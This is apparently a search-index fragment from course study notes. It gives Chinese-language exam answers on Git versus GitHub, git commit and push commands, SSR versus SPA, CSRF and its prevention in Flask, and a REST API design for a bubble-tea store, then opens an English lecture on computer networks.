\u89e3\u91ca Git \u548c GitHub \u4e4b\u95f4\u7684\u533a\u522b (4 \u5206)</p> <p>Git \u662f\u4e00\u79cd \u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236\u7cfb\u7edf (Distributed Version Control System)\u3002\u5176\u6838\u5fc3\u76ee\u7684\u662f\u5e2e\u52a9\u5f00\u53d1\u8005 \u8ddf\u8e2a\u548c\u7ba1\u7406\u4ee3\u7801\u53d8\u66f4\u5386\u53f2\uff0c\u5e76 \u652f\u6301\u56e2\u961f\u534f\u4f5c\u3002Git \u8bb0\u5f55\u4ee3\u7801\u7684\u6bcf\u4e00\u6b21\u4fee\u6539\uff0c\u5e76\u80fd\u5c06\u4ee3\u7801\u6062\u590d\u5230\u4e4b\u524d\u7684\u67d0\u4e2a\u7a33\u5b9a\u72b6\u6001\u3002Git \u9879\u76ee\u7684\u5386\u53f2\u8bb0\u5f55\u88ab\u6784\u9020\u6210\u4e00\u4e2a\u975e\u7ebf\u6027\u7684\u56fe\u7ed3\u6784\uff0c\u56fe\u4e2d\u7684\u6bcf\u4e2a\u8282\u70b9\u4ee3\u8868\u4e00\u7ec4\u4ee3\u7801\u66f4\u6539\uff0c\u79f0\u4e3a\u63d0\u4ea4 (commit)\u3002\u5b83\u63d0\u4f9b\u4e86\u5904\u7406\u4e0d\u540c\u5f00\u53d1\u8005\u5bf9\u540c\u4e00\u4ee3\u7801\u90e8\u5206\u4fee\u6539\u4e4b\u95f4\u51b2\u7a81\u7684\u673a\u5236\u3002Git \u7531 Linus Torvalds \u4e8e 2005 \u5e74\u5f00\u53d1\uff0c\u662f\u76ee\u524d\u4e16\u754c\u4e0a\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u7248\u672c\u63a7\u5236\u7cfb\u7edf\u3002</p> <p>\u800c GitHub \u662f\u4e00\u4e2a \u6258\u7ba1 Git \u4ed3\u5e93\u7684\u670d\u52a1\u5e73\u53f0\u3002\u5b83\u7684\u76ee\u7684\u662f\u4e3a Git \u4ed3\u5e93\u63d0\u4f9b \u5728\u7ebf\u5b58\u50a8\u3002\u901a\u8fc7 GitHub\uff0c\u56e2\u961f\u6210\u5458\u53ef\u4ee5\u5c06\u5176 Git \u4ed3\u5e93\u653e\u5728\u4e00\u4e2a\u4e2d\u5fc3\u4f4d\u7f6e\uff0c\u5e76\u901a\u8fc7\u4ece GitHub \u4ed3\u5e93\u62c9\u53d6 (pull) \u548c\u5411\u5176\u63a8\u9001 (push) \u4ee3\u7801\u6765\u8fdb\u884c \u534f\u4f5c\u5f00\u53d1\u3002\u9664\u4e86\u4ee3\u7801\u6258\u7ba1\uff0cGitHub \u8fd8\u63d0\u4f9b\u4e00\u7cfb\u5217\u5de5\u5177\u6765\u652f\u6301\u654f\u6377\u9879\u76ee\u7ba1\u7406\uff0c\u5982 \u95ee\u9898\u8ddf\u8e2a (Issues) \u548c \u4ee3\u7801\u5ba1\u67e5 (Code Review)\uff0c\u8fd9\u4e9b\u529f\u80fd\u901a\u8fc7\u62c9\u53d6\u8bf7\u6c42 (Pull requests) \u5b9e\u73b0\u3002\u56e0\u6b64\uff0c\u533a\u522b\u5728\u4e8e\uff1a</p> <ul> <li>Git \u662f\u4e00\u4e2a\u8f6f\u4ef6\u5de5\u5177 (\u7248\u672c\u63a7\u5236\u7cfb\u7edf) \uff0c\u7528\u4e8e\u7ba1\u7406\u4ee3\u7801\u7684\u53d8\u66f4\u5386\u53f2\u548c\u534f\u4f5c\u3002</li> <li>GitHub \u662f\u4e00\u4e2a\u5728\u7ebf\u5e73\u53f0 (\u670d\u52a1) \uff0c\u7528\u4e8e\u6258\u7ba1 Git \u4ed3\u5e93\uff0c\u5e76\u63d0\u4f9b\u989d\u5916\u7684\u534f\u4f5c\u548c\u9879\u76ee\u7ba1\u7406\u529f\u80fd\u3002</li> </ul> <p>\u60a8\u53ef\u4ee5\u628a Git \u60f3\u8c61\u6210\u60a8\u672c\u5730\u7535\u8111\u4e0a\u7684\u4e00\u4e2a\u5f3a\u5927\u7684\u6587\u4ef6\u7ba1\u7406\u5de5\u5177\uff0c\u800c GitHub \u5219\u662f\u4e92\u8054\u7f51\u4e0a\u7684\u4e00\u4e2a\u793e\u4ea4\u548c\u5b58\u50a8\u5e73\u53f0\uff0c\u8ba9\u60a8\u53ef\u4ee5\u5b58\u50a8\u60a8\u7684\u6587\u4ef6\uff08\u4ee3\u7801\uff09\u5e76\u4e0e\u4ed6\u4eba\u5171\u4eab\u548c\u534f\u4f5c\u3002</p> <p>b. \u5728\u672c\u5730 Git \u4ed3\u5e93\u4e2d\uff0c\u60a8\u521a\u521a\u4e3a Flask \u670d\u52a1\u5668\u6dfb\u52a0\u4e86\u4e00\u4e2a\u65b0\u7684\u8def\u7531\uff0c\u8be5\u8def\u7531\u8fd4\u56de\u5f53\u524d\u7528\u6237\u6700\u559c\u6b22\u7684\u6ce1\u6ce1\u8336\u5438\u7ba1\u7c7b\u578b\u3002<code>git status</code> \u547d\u4ee4\u8fd4\u56de\u4ee5\u4e0b\u8f93\u51fa\uff1a</p> <pre><code>On branch main\nYour branch is up to date with 'origin/main'.\nChanges not staged for commit:\n  modified: app/models.py\n  modified: app/routes.py\n</code></pre> <p>\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684 Git \u547d\u4ee4\u5e8f\u5217\uff0c\u4f7f\u5f97\u60a8\u6240\u505a\u7684\u66f4\u6539\u5b58\u50a8\u5728 <code>main</code> \u5206\u652f\u4e0a - \u5305\u62ec\u5728\u672c\u5730\u4ed3\u5e93\u548c\u540d\u4e3a <code>origin</code> \u7684\u8fdc\u7a0b\u4ed3\u5e93\u4e2d\u3002 (3 \u5206)</p> <p>\u6839\u636e <code>git status</code> \u7684\u8f93\u51fa\uff0c\u60a8\u5bf9 <code>app/models.py</code> \u548c <code>app/routes.py</code> \u8fdb\u884c\u4e86\u4fee\u6539\uff0c\u4f46\u8fd9\u4e9b\u4fee\u6539\u5c1a\u672a\u88ab\u6682\u5b58 (staged) \u4ee5\u8fdb\u884c\u63d0\u4ea4\u3002\u8981\u5c06\u8fd9\u4e9b\u66f4\u6539\u5b58\u50a8\u5728\u672c\u5730 <code>main</code> \u5206\u652f\u5e76\u63a8\u9001\u5230\u8fdc\u7a0b <code>origin</code> \u4ed3\u5e93\uff0c\u60a8\u9700\u8981\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5e8f\u5217\uff1a</p> <ol> <li>\u6682\u5b58\u66f4\u6539\uff1a\u4f7f\u7528 <code>git add</code> \u547d\u4ee4\u5c06\u4fee\u6539\u7684\u6587\u4ef6\u6dfb\u52a0\u5230\u6682\u5b58\u533a\u3002</li> </ol> <pre><code>git add app/models.py app/routes.py\n# \u6216\u8005\u4f7f\u7528 git add . \u6765\u6682\u5b58\u5f53\u524d\u76ee\u5f55\u53ca\u5b50\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u66f4\u6539\n</code></pre> <p>\uff08\u9009\u62e9\u5176\u4e2d\u4e00\u79cd\u5373\u53ef\uff09</p> <ol> <li>\u63d0\u4ea4\u66f4\u6539\uff1a\u4f7f\u7528 <code>git commit</code> \u547d\u4ee4\u5c06\u6682\u5b58\u533a\u7684\u66f4\u6539\u63d0\u4ea4\u5230\u672c\u5730\u4ed3\u5e93\u7684\u5f53\u524d\u5206\u652f (<code>main</code>)\u3002\u63d0\u4ea4\u65f6\u9700\u8981\u63d0\u4f9b\u4e00\u4e2a\u63d0\u4ea4\u4fe1\u606f (commit message) \u6765\u63cf\u8ff0\u672c\u6b21\u66f4\u6539\u7684\u76ee\u7684\u548c\u5185\u5bb9\u3002</li> </ol> <pre><code>git commit -m \"Add new route for favourite bubble tea straw type\"\n</code></pre> <p>\uff08\u63d0\u4ea4\u4fe1\u606f\u5e94\u6e05\u6670\u8bf4\u660e\u672c\u6b21\u63d0\u4ea4\u505a\u4e86\u4ec0\u4e48\uff09</p> <ol> <li>\u63a8\u9001\u66f4\u6539\uff1a\u4f7f\u7528 <code>git push</code> \u547d\u4ee4\u5c06\u672c\u5730 <code>main</code> \u5206\u652f\u7684\u63d0\u4ea4\u63a8\u9001\u5230\u540d\u4e3a <code>origin</code> \u7684\u8fdc\u7a0b\u4ed3\u5e93\u7684 <code>main</code> \u5206\u652f\u3002</li> </ol> <pre><code>git push origin main\n</code></pre> <p>\u6240\u4ee5\uff0c\u4e00\u4e2a\u5b8c\u6574\u7684\u547d\u4ee4\u5e8f\u5217\u662f\uff1a</p> <pre><code>git add app/models.py app/routes.py\ngit commit -m \"Add new route for favourite bubble tea straw type\"\ngit push origin main\n</code></pre> <p>\u6216\u8005\uff1a</p> <pre><code>git add .\ngit commit -m \"Add new route for favourite bubble tea straw type\"\ngit push origin main\n</code></pre> <p>c. \u9009\u62e9 part b \u4e2d\u7684\u4e00\u4e2a\u547d\u4ee4\uff0c\u89e3\u91ca\u5b83\u53ef\u80fd\u4e0d\u4f1a\u6210\u529f\u7684\u539f\u56e0\u3002\u60a8\u65e0\u9700\u63cf\u8ff0\u5982\u4f55\u4fee\u590d\u95ee\u9898\u3002(1 \u5206)</p> <p>\u6211\u9009\u62e9\u547d\u4ee4 <code>git push origin main</code>\u3002</p> <p>\u8fd9\u4e2a\u547d\u4ee4\u53ef\u80fd\u4e0d\u4f1a\u6210\u529f\u7684\u95ee\u9898\u662f\uff0c\u81ea\u60a8\u4e0a\u6b21\u4ece\u8fdc\u7a0b\u4ed3\u5e93 <code>origin</code> \u62c9\u53d6\u4ee3\u7801\u4ee5\u6765\uff0c\u8fdc\u7a0b\u4ed3\u5e93\u7684 <code>main</code> \u5206\u652f\u53ef\u80fd\u5df2\u7ecf\u88ab\u5176\u4ed6\u4eba\u66f4\u65b0\u4e86\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u8fdc\u7a0b\u4ed3\u5e93 <code>origin/main</code> \u5305\u542b\u4e86\u60a8\u672c\u5730\u4ed3\u5e93 <code>main</code> \u5206\u652f\u4e2d\u6ca1\u6709\u7684\u63d0\u4ea4\u3002\u5f53\u60a8\u5c1d\u8bd5\u63a8\u9001\u60a8\u7684\u672c\u5730\u63d0\u4ea4\u65f6\uff0cGit \u4f1a\u68c0\u6d4b\u5230\u8fdc\u7a0b\u4ed3\u5e93\u6709\u65b0\u7684\u63d0\u4ea4\u5386\u53f2\uff0c\u5e76\u4e14\u60a8\u7684\u63d0\u4ea4\u4e0d\u662f\u57fa\u4e8e\u6700\u65b0\u7684\u8fdc\u7a0b\u63d0\u4ea4\u8fdb\u884c\u7684\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u63a8\u9001\u4f1a\u88ab\u62d2\u7edd\uff0c\u60a8\u9700\u8981\u5148\u62c9\u53d6\u8fdc\u7a0b\u7684\u6700\u65b0\u66f4\u6539\uff0c\u89e3\u51b3\u53ef\u80fd\u51fa\u73b0\u7684\u5408\u5e76\u51b2\u7a81\uff08\u5982\u679c\u60a8\u7684\u66f4\u6539\u4e0e\u8fdc\u7a0b\u7684\u66f4\u6539\u4fee\u6539\u4e86\u540c\u4e00\u6587\u4ef6\u7684\u76f8\u540c\u90e8\u5206\uff09\uff0c\u7136\u540e\u624d\u80fd\u518d\u6b21\u5c1d\u8bd5\u63a8\u9001\u3002</p>"},{"location":"cs/mern/3403/2024/#q6","title":"Q6","text":"<p>Server-Side Rendering, SSR </p> <p>Pros</p> <ul> <li>\u6709\u5229\u4e8e \u641c\u7d22\u5f15\u64ce\u4f18\u5316 (SEO)\uff0c\u56e0\u4e3a\u641c\u7d22\u5f15\u64ce\u722c\u866b\u53ef\u4ee5\u76f4\u63a5\u6293\u53d6\u5b8c\u6574\u7684\u9875\u9762\u5185\u5bb9</li> <li>\u9996\u6b21\u5185\u5bb9\u52a0\u8f7d\u901f\u5ea6\u901a\u5e38\u66f4\u5feb (First Contentful Paint)</li> </ul> <p>Cons</p> <ul> <li>\u6bcf\u6b21\u9875\u9762\u66f4\u65b0\u901a\u5e38\u9700\u8981\u91cd\u65b0\u751f\u6210\u5e76\u53d1\u9001\u6574\u4e2a\u9875\u9762\uff0c\u8fd9\u5728\u5f00\u53d1\u548c\u5e26\u5bbd\u65b9\u9762\u91cd\u91cf\u7ea7\u4e14\u6602\u8d35\u3002</li> <li>\u6bcf\u6b21\u66f4\u65b0\u90fd\u9700\u8981\u53d1\u9001\u5927\u91cf\u6570\u636e\uff0c\u53ef\u80fd\u5bfc\u81f4\u5ef6\u8fdf\u3002</li> <li>\u670d\u52a1\u5668\u8d1f\u8d23\u5927\u90e8\u5206\u6e32\u67d3\u5de5\u4f5c\uff0c\u670d\u52a1\u5668\u8d1f\u8f7d\u8f83\u9ad8</li> </ul> <p>Single Page Application, SPA</p> <p>\u670d\u52a1\u5668\u521d\u59cb\u53d1\u9001\u4e00\u4e2a\u57fa\u672c\u7684 HTML \u9aa8\u67b6\u4ee5\u53ca CSS \u548c JavaScript \u6587\u4ef6\u3002\u9875\u9762\u7684\u5927\u90e8\u5206\u5185\u5bb9\u4e0d\u662f\u5728\u670d\u52a1\u5668\u4e0a\u751f\u6210\u7684\u3002\u5ba2\u6237\u7aef\u7684 JavaScript \u4ee3\u7801\u63a5\u6536\u5230\u8fd9\u4e9b\u6587\u4ef6\u540e\u6267\u884c\uff0c\u5e76\u5229\u7528\u4ece\u670d\u52a1\u5668\u5f02\u6b65\u83b7\u53d6\u7684\u6570\u636e\uff08\u901a\u5e38\u901a\u8fc7 AJAX \u8bf7\u6c42\uff0c\u683c\u5f0f\u5982 JSON\uff09\u6765\u52a8\u6001\u6784\u5efa\u6216\u4fee\u6539\u9875\u9762\u7ed3\u6784\u3002\u9875\u9762\u66f4\u65b0\u901a\u8fc7\u53d1\u9001\u5c11\u91cf\u6570\u636e\u5e76\u4ec5\u4fee\u6539 DOM \u7684\u7279\u5b9a\u90e8\u5206\u6765\u5b8c\u6210</p> <p>SPA \u6574\u4e2a\u7f51\u7ad9\u901a\u5e38\u7531\u4e00\u4e2a HTML \u9875\u9762\u63d0\u4f9b\u662f\u5ba2\u6237\u7aef\u6e32\u67d3\u7684\u4e00\u79cd\u6781\u81f4\u5e94\u7528</p> <p>Pros:</p> <ul> <li>\u51cf\u8f7b\u670d\u52a1\u5668\u8d1f\u8f7d\uff0c\u56e0\u4e3a\u5ba2\u6237\u7aef\u627f\u62c5\u4e86\u5927\u90e8\u5206\u6e32\u67d3\u548c\u903b\u8f91\u5de5\u4f5c</li> </ul> <ul> <li>\u7406\u8bba\u4e0a\u53ef\u4ee5\u63d0\u4f9b\u66f4\u6d41\u7545\u3001\u54cd\u5e94\u66f4\u5feb\u7684\u7528\u6237\u4f53\u9a8c\uff0c\u56e0\u4e3a\u9875\u9762\u66f4\u65b0\u65e0\u9700\u5b8c\u6574\u7684\u9875\u9762\u91cd\u65b0\u52a0\u8f7d</li> <li>\u53ef\u4ee5\u4f7f\u7528\u540c\u4e00\u4e2a\u540e\u7aef API \u4e3a Web \u5e94\u7528\u548c\u539f\u751f\u79fb\u52a8\u5e94\u7528\u63d0\u4f9b\u6570\u636e</li> </ul> <p>Cons:</p> <ul> <li>\u521d\u59cb\u52a0\u8f7d\u65f6\u95f4\u53ef\u80fd\u8f83\u957f\uff0c\u56e0\u4e3a\u9700\u8981\u4f20\u8f93\u548c\u6267\u884c\u5927\u91cf\u7684 JavaScript \u4ee3\u7801\u3002</li> </ul> <ul> <li>\u641c\u7d22\u5f15\u64ce\u4f18\u5316 (SEO) \u662f\u4e2a\u95ee\u9898\uff0c\u4f20\u7edf\u722c\u866b\u53ef\u80fd\u65e0\u6cd5\u6293\u53d6\u52a8\u6001\u751f\u6210\u7684\u5185\u5bb9\u3002</li> </ul> <ul> <li>\u6d4f\u89c8\u5668\u7684\u524d\u8fdb\u548c\u540e\u9000\u6309\u94ae\u3001\u4ee5\u53ca\u9875\u9762\u5237\u65b0\u53ef\u80fd\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u884c\u4e3a\u53ef\u80fd\u4e0d\u7a33\u5b9a\u3002</li> </ul>"},{"location":"cs/mern/3403/2024/#q7","title":"Q7","text":"<p>\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 (CSRF) \u653b\u51fb\u5982\u4f55\u5de5\u4f5c</p> <p>\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u653b\u51fb\u5229\u7528\u7684\u662f\u7528\u6237\u53ef\u80fd\u5df2\u7ecf\u5728\u4e00\u4e2a\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u4e86\u8eab\u4efd\u9a8c\u8bc1\u7684\u4e8b\u5b9e\u3002\u653b\u51fb\u8005\u4f1a\u8bf1\u9a97\u7528\u6237\uff08\u4f8b\u5982\uff0c\u901a\u8fc7\u7535\u5b50\u90ae\u4ef6\u4e2d\u7684\u4e00\u4e2a\u94fe\u63a5\uff09\u5411\u4ed6\u4eec\u5df2\u7ecf\u767b\u5f55\u7684\u7f51\u7ad9\u53d1\u51fa\u4e00\u4e2a\u975e\u9884\u671f\u7684\u8bf7\u6c42\uff08\u4f8b\u5982\uff0c\u5411\u94f6\u884c\u7f51\u7ad9\u53d1\u8d77\u4e00\u7b14\u8f6c\u8d26\u8bf7\u6c42\uff09\u3002</p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u7684\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u53d1\u9001\u4e0e\u8be5\u7f51\u7ad9\u57df\u540d\u5173\u8054\u7684 cookies\u3002\u670d\u52a1\u5668\u63a5\u6536\u5230\u8bf7\u6c42\u548c cookie \u540e\uff0c\u4f1a\u68c0\u67e5 cookie \u5e76\u8ba4\u4e3a\u8be5\u8bf7\u6c42\u6765\u81ea\u5408\u6cd5\u7528\u6237\uff0c\u7136\u540e\u6267\u884c\u76f8\u5e94\u7684\u64cd\u4f5c\u3002\u5373\u4f7f\u8fd9\u4e2a\u8bf7\u6c42\u662f\u7531\u7528\u6237\u65e0\u610f\u4e2d\u89e6\u53d1\u7684\uff08\u4f8b\u5982\uff0c\u70b9\u51fb\u4e86\u653b\u51fb\u8005\u63d0\u4f9b\u7684\u6076\u610f\u94fe\u63a5\uff09\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u56e0\u4e3a\u5b83\u5e26\u6709\u6709\u6548\u7684\u8eab\u4efd\u9a8c\u8bc1 cookie \u800c\u5c06\u5176\u89c6\u4e3a\u5408\u6cd5\u8bf7\u6c42\u5e76\u6267\u884c\u3002</p> <p>\u5982\u4f55\u5728 Flask \u4e2d\u9632\u5fa1 CSRF \u653b\u51fb</p> <p>\u9632\u5fa1 CSRF \u653b\u51fb\u7684\u6838\u5fc3\u65b9\u6cd5\u662f\u5728\u670d\u52a1\u5668\u6e32\u67d3\u8868\u5355\u65f6\uff0c\u751f\u6210\u4e00\u4e2a\u79d8\u5bc6\u4ee4\u724c\uff08secret token\uff09\u5e76\u5c06\u5176\u5305\u542b\u5728\u8868\u5355\u4e2d\u3002\u8fd9\u4e2a\u4ee4\u724c\u662f\u4f7f\u7528 Flask \u914d\u7f6e\u4e2d\u7684 secret key \u751f\u6210\u7684\u968f\u673a\u6570\u3002\u653b\u51fb\u8005\u7531\u4e8e\u4e0d\u77e5\u9053\u670d\u52a1\u5668\u7684 secret key\uff0c\u65e0\u6cd5\u4f2a\u9020 \u8fd9\u4e2a\u4ee4\u724c\u3002</p> <p>\u5f53\u7528\u6237\u63d0\u4ea4\u8868\u5355\u65f6\uff08\u901a\u5e38\u662f\u901a\u8fc7\u4e00\u4e2a POST \u8bf7\u6c42\uff09\uff0c\u63d0\u4ea4\u7684\u6570\u636e\u4e2d\u4e5f\u4f1a\u5305\u542b\u8fd9\u4e2a\u79d8\u5bc6\u4ee4\u724c\u3002\u670d\u52a1\u5668\u5728\u5904\u7406\u8bf7\u6c42\u65f6\uff0c\u4f1a\u68c0\u67e5\u5e76\u9a8c\u8bc1\u63d0\u4ea4\u7684\u4ee4\u724c\u662f\u5426\u6709\u6548\uff0c\u4f8b\u5982\u5728 Flask-WTF \u8868\u5355\u7684 <code>validate_on_submit</code> \u65b9\u6cd5\u4e2d\u8fdb\u884c\u9a8c\u8bc1\u3002\u8fd9\u6837\uff0c\u670d\u52a1\u5668\u53ea\u54cd\u5e94\u901a\u8fc7\u5b98\u65b9\u8868\u5355\u751f\u6210\u7684\u8bf7\u6c42\uff0c\u800c\u5ffd\u7565\u90a3\u4e9b\u6ca1\u6709\u6709\u6548\u4ee4\u724c\u6216\u4ee4\u724c\u4e0d\u5339\u914d\u7684\u8bf7\u6c42\u3002</p> <p>\u5728 Flask \u4e2d\uff0cFlask-WTF\uff08\u5b83\u4f7f\u7528\u4e86 WTForms \u5e93\uff09\u4e3a CSRF \u4fdd\u62a4\u63d0\u4f9b\u4e86\u6781\u5927\u7684\u4fbf\u5229\u3002\u60a8\u9700\u8981\u5728 Flask \u5e94\u7528\u914d\u7f6e\u4e2d\u8bbe\u7f6e\u4e00\u4e2a SECRET_KEY\u3002\u5728\u6a21\u677f\u4e2d\u6e32\u67d3\u8868\u5355\u65f6\uff0c\u9700\u8981\u5305\u542b\u4e00\u4e2a\u9690\u85cf\u5b57\u6bb5\u6765\u8f93\u51fa CSRF \u4ee4\u724c\u3002WTForms \u4f1a\u81ea\u52a8\u751f\u6210\u8fd9\u4e2a\u4ee4\u724c\u3002\u4f8b\u5982\uff0c\u5728 Jinja \u6a21\u677f\u4e2d\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 <code>{{ form.csrf_token }}</code> \u6216 <code>{{ form.hidden_tag() }}</code> \u6765\u5305\u542b\u5fc5\u8981\u7684\u9690\u85cf\u5b57\u6bb5\uff0c\u5176\u4e2d\u5305\u542b\u4e86 CSRF \u4ee4\u724c\u3002\u5f53\u8868\u5355\u63d0\u4ea4\u65f6\uff0cFlask-WTF \u4f1a\u81ea\u52a8\u9a8c\u8bc1\u6b64\u4ee4\u724c\u3002</p> <p>\u6b64\u5b89\u5168\u654f\u611f\u7684\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u4f1a\u975e\u5e38\u5feb\u901f\u5730\u4f7f\u7b7e\u540d\u7684 cookie \u8d85\u65f6\uff08\u4f8b\u5982\uff0c\u5927\u7ea6 5 \u5206\u949f\uff09\uff0c\u8fd9\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u79cd\u8f85\u52a9\u9632\u5fa1\u63aa\u65bd\u3002</p>"},{"location":"cs/mern/3403/2024/#q8","title":"Q8","text":"<p>API \u5c06\u57fa\u4e8e RESTful \u67b6\u6784\u98ce\u683c\u8bbe\u8ba1\uff0c\u4f7f\u7528 HTTP \u534f\u8bae\u8fdb\u884c\u901a\u4fe1\uff0c\u5e76\u901a\u8fc7 URL \u8bc6\u522b\u8d44\u6e90\u3002\u6570\u636e\u4ea4\u6362\u683c\u5f0f\u5c06\u4e3b\u8981\u91c7\u7528 JSON\u3002</p> <p>API \u7684\u57fa\u7840 URL \u5047\u5b9a\u4e3a <code>www.bubbleT.com/api/v1</code>\u3002</p> <p>\u6838\u5fc3 API \u7aef\u70b9\uff1a</p> <ol> <li>\u83b7\u53d6\u6240\u6709\u5546\u5e97\u5217\u8868 [\u6839\u636e\u9879\u76ee\u9700\u6c42]    - HTTP \u65b9\u6cd5\uff1a <code>GET</code>    - URL \u8def\u5f84\uff1a <code>/api/v1/stores</code>    - \u76ee\u7684\uff1a \u5141\u8bb8\u5ba2\u6237\u7aef\u83b7\u53d6\u6240\u6709\u5546\u5e97\u7684\u7b80\u8981\u4fe1\u606f\uff0c\u4ee5\u4fbf\u7528\u6237\u9009\u62e9 [\u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002    - \u54cd\u5e94\uff1a JSON \u683c\u5f0f\u7684\u5546\u5e97\u5217\u8868\uff08\u4f8b\u5982 <code>[{\"id\": 1, \"name\": \"\u4e3b\u5e97\"}, ...]</code>\uff09[\u6839\u636e\u9879\u76ee\u9700\u6c42, 15, 56]\u3002</li> <li>\u83b7\u53d6\u7279\u5b9a\u5546\u5e97\u7684\u53e3\u5473\u5217\u8868 [\u6839\u636e\u9879\u76ee\u9700\u6c42]    - HTTP \u65b9\u6cd5\uff1a <code>GET</code>    - URL \u8def\u5f84\uff1a <code>/api/v1/stores/{store_id}/flavors</code>    - \u76ee\u7684\uff1a \u83b7\u53d6\u6307\u5b9a\u5546\u5e97\u63d0\u4f9b\u7684\u6240\u6709\u53e3\u5473\u53ca\u5176\u8be6\u7ec6\u4fe1\u606f [\u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002    - \u8def\u5f84\u53c2\u6570\uff1a <code>{store_id}</code> - \u5546\u5e97\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002    - \u67e5\u8be2\u53c2\u6570\uff08\u53ef\u9009\uff09\uff1a <code>sort_by</code> (\u53ef\u9009\u503c: <code>name</code>, <code>price</code>), <code>order</code> (\u53ef\u9009\u503c: <code>asc</code>, <code>desc</code>) \u7528\u4e8e\u6392\u5e8f [\u6839\u636e\u9879\u76ee\u9700\u6c42, 56]\u3002    - \u54cd\u5e94\uff1a JSON \u683c\u5f0f\u7684\u53e3\u5473\u5217\u8868\uff0c\u5305\u542b\u540d\u79f0\u3001\u4ef7\u683c\u3001\u56fe\u7247 URL \u548c\u70b9\u8d5e\u6570 [\u6839\u636e\u9879\u76ee\u9700\u6c42, 15, 31, 56]\u3002</li> <li>\u70b9\u8d5e\u7279\u5b9a\u53e3\u5473 [\u6839\u636e\u9879\u76ee\u9700\u6c42]    - HTTP \u65b9\u6cd5\uff1a <code>POST</code>    - URL \u8def\u5f84\uff1a <code>/api/v1/flavors/{flavor_id}/likes</code>    - \u76ee\u7684\uff1a \u589e\u52a0\u6307\u5b9a\u53e3\u5473\u7684\u603b\u70b9\u8d5e\u6570 [\u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002    - \u8def\u5f84\u53c2\u6570\uff1a <code>{flavor_id}</code> - \u53e3\u5473\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002    - \u8bf7\u6c42\u4f53\uff1a \u901a\u5e38\u4e3a\u7a7a\u6216\u5305\u542b\u975e\u654f\u611f\u4fe1\u606f\u3002\u57fa\u4e8e\u9879\u76ee\u8981\u6c42\u201c\u4e0d\u8ddf\u8e2a\u4efb\u4f55\u5173\u4e8e\u6211\u4eec\u5ba2\u6237\u7684\u4fe1\u606f\u201d\uff0c\u670d\u52a1\u5668\u4e0d\u8bc6\u522b\u6216\u5b58\u50a8\u70b9\u8d5e\u5ba2\u6237\u4fe1\u606f [\u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002    - \u5904\u7406\uff1a \u6bcf\u6b21\u6210\u529f\u8c03\u7528\u6b64\u7aef\u70b9\uff0c\u670d\u52a1\u5668\u7b80\u5355\u5730\u5c06\u8be5\u53e3\u5473\u7684\u70b9\u8d5e\u603b\u6570\u52a0 1 [\u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002    - \u54cd\u5e94\uff1a \u53ef\u80fd\u8fd4\u56de\u66f4\u65b0\u540e\u7684\u70b9\u8d5e\u603b\u6570\u6216\u53e3\u5473\u4fe1\u606f [\u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002</li> </ol> <p>\u6838\u5fc3\u5047\u8bbe\uff1a</p> <ul> <li>API \u4f7f\u7528 JSON \u8fdb\u884c\u6570\u636e\u4ea4\u6362\u3002</li> <li>API \u4f7f\u7528\u6807\u51c6 HTTP \u72b6\u6001\u7801\uff08\u5982 200 OK, 404 Not Found\uff09\u8868\u793a\u7ed3\u679c\u3002</li> <li>\u70b9\u8d5e\u529f\u80fd\u4e0d\u5173\u8054\u5177\u4f53\u7684\u5ba2\u6237\u8eab\u4efd\u4fe1\u606f [\u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002</li> <li>\u53e3\u5473\u56fe\u7247\u901a\u8fc7 URL \u63d0\u4f9b\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u5d4c\u5165\u54cd\u5e94\u6570\u636e\u4e2d [31, \u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002</li> <li>\u5546\u5e97\u3001\u53e3\u5473\u548c\u70b9\u8d5e\u6570\u7b49\u6570\u636e\u5b58\u50a8\u5728\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\u5e93\u4e2d [25, \u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002</li> <li>\u540c\u4e00\u5ba2\u6237\u53ef\u4ee5\u591a\u6b21\u70b9\u8d5e\u540c\u4e00\u53e3\u5473\uff0c\u6bcf\u6b21\u70b9\u8d5e\u90fd\u4f1a\u8ba1\u5165\u603b\u6570 [\u6839\u636e\u9879\u76ee\u9700\u6c42]\u3002</li> </ul>"},{"location":"cs/mern/3403/l1/","title":"1.0 Intro","text":""},{"location":"cs/mern/3403/l1/#what-is-a-computer-network","title":"What is a computer network?","text":"<p>A computer network is a structure linking devices together for the purpose of communication. It can be modelled as a graph, where each individual device is modelled as a node in the graph, and the physical connection between two devices is modelled as an edge in the graph. The purpose of the network is to allow computers to talk to each other. These connections can be implemented in a variety of ways, including physical cables, fibre-optic cables, satellites, and phone lines.</p>"},{"location":"cs/mern/3403/l1/#the-current-structure-of-the-internet","title":"The current structure of the internet","text":"<p>Today's Internet is still a network of interconnected networks. Although almost every computer in the world is connected to almost every other computer, different parts of the Internet are run by different organisations. High-speed backbone links were created to carry large amounts of data. Smaller networks connect to these backbones, allowing any user on any network to exchange data with any other user. These backbone links and individual networks can be owned by companies, universities, or nation states. The Internet achieved ARPA's original goal that if part of its infrastructure is destroyed, data can still flow through the remaining networks (in principle), although recent 